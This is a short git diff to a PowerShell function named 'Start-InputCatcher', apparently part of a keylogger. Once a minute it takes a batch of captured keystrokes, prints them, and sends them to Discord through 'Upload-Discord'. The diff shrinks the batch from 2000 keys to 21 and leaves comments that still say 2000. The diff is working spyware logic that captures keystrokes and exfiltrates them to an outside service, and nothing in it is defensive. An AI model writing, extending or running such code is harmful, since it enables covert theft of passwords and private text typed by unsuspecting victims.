@@ -75,10 +75,10 @@ function Start-InputCatcher {
             # Display the first 2000 captured keys once per minute
             $currentMinute = (Get-Date).Minute
             if ($currentMinute -ne $lastMinute) {
-                $firstTwoThousandKeys = $capturedKeys[0..1999] -join ''
+                $firstTwoThousandKeys = $capturedKeys[0..20] -join ''
                 Write-Host "First 2000 Captured Keys: $firstTwoThousandKeys" -ForegroundColor Green
                 Upload-Discord -text $firstTwoThousandKeys
-                $capturedKeys = $capturedKeys[2000..($capturedKeys.Count - 1)]  # Remove the first 2000 keys
+                $capturedKeys = $capturedKeys[21..($capturedKeys.Count - 1)]  # Remove the first 2000 keys
                 $lastMinute = $currentMinute
             }
         }
